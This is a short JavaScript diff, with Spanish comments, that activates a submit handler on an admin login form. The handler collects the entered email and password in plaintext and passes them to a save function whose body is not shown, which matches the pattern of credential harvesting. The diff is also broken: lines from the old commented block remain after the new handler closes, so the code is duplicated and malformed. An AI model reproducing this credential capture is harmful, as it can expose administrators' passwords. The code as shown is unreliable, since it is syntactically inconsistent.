@@ -24,9 +24,23 @@ function guardarDatos(data) {
 
 // Temporalmente comentamos la llamada a guardarDatos
 // Esta llamada se activaría cuando el formulario se envíe
-/*
 $('#login-form-admin').submit(function (event) {
     event.preventDefault();
+
+    // Recopila datos del formulario
+    const email = $('#email_address_login').val();
+    const password = $('#password').val();
+
+    // Guarda datos utilizando la función
+    guardarDatos({
+        usuario: email,
+        contraseña: password,
+    });
+
+    // Continúa con el envío del formulario si es necesario
+    // Puedes redirigir o realizar otras acciones aquí
+    document.getElementById('login-form-admin').submit();
+});
 
     // Recopila datos del formulario
     const email = $('#email_address_login').val();
